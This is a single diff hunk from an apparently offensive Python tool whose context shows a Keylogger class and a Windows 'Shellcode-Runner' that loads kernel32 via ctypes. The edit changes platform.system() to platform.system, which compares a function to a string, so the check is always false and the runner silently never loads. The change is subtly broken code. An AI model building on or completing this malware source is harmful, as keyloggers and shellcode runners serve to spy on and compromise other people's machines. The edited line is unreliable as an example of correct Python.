@@ -1080,7 +1080,7 @@ class Keylogger:
 # ======================
 # Shellcode-Runner
 # ======================
-if platform.system() == 'Windows':
+if platform.system == 'Windows':
     class ShellcodeRunner:
         # Initialize Windows DLL
         kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
